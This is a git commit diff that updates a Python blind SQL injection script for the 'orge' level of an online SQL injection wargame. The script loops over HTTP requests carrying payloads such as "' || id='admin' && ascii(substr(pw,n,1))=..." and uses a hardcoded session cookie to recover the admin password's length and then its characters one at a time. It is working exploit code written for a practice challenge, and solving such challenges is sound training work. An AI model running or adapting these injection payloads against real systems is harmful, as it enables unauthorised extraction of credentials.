e3b5379d462194dcf961cb17638b6257a7eca712
thisisyoobi <thisisyoobi@gmail.com>
2022-03-09 22:30:57 +0900

    orge exploit.py

--- LOS/07-orge.py
+++ LOS/07-orge.py
@@ -2,7 +2,7 @@ import requests
 import string
 
 header = {"Cookie": "PHPSESSID=93bvl3l66u57rtt993gi4tn90d;"}
-url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
+url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
 string_data = string.digits + string.ascii_letters
 
 print(string_data)
@@ -12,7 +12,7 @@ password_len = 1
 
 # find password length
 while True:
-    data = "?pw=' or id='admin' and length(pw)={}%23".format(str(password_len))
+    data = "?pw=' || id='admin' %26%26 length(pw)={}%23".format(str(password_len))
     response = requests.get(url + data, headers=header)
     if response.text.find("Hello admin") != -1:
         break
@@ -24,9 +24,9 @@ print("[+] Get Password Length : " + str(password_len))
 for idx in range(1, password_len + 1):
     for i in string_data:
         # data = "?pw=' or id='admin' and pw like '{}{}%".format(password,i)
-        # data = "?pw=' or id='admin' and ord(substr(pw,{},1))={}%23".format(idx,ord(i))
-        data = "?pw=' or id='admin' and substr(pw,{},1)={}%23".format(idx,i)
-        print(data)
+        # data = "?pw=' or id='admin' and substr(pw,{},1)={}%23".format(idx,i)
+        data = "?pw=' || id='admin' %26%26 ascii(substr(pw,{},1))={}%23".format(idx,ord(i))
+        # print(data)
         response = requests.get(url + data, headers=header)
         if response.text.find("Hello admin") != -1:
             password = password + i
